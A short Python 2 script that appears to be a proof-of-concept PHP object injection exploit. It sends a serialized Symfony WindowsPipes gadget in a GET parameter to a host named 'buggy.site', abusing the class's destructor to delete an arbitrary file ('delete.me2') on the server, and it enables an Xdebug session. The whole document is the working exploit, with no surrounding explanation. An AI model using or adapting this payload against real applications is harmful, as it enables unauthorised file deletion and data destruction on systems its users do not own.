#!/usr/bin/python

import requests

if __name__ == '__main__':
    data = {'data': 'a:2:{s:4:"name";s:4:"User";s:4:"z123";O:44:"Symfony\\Component\\Process\\Pipes\\WindowsPipes":1:{s:51:"\0Symfony\\Component\\Process\\Pipes\\WindowsPipes\0files";a:1:{i:0;s:10:"delete.me2";}}}','XDEBUG_SESSION_START': 'PHPSTORM'}
    session = requests.session()

    response = session.get('http://buggy.site:8080/index.php', params=data)

    print response.text.encode('utf-8')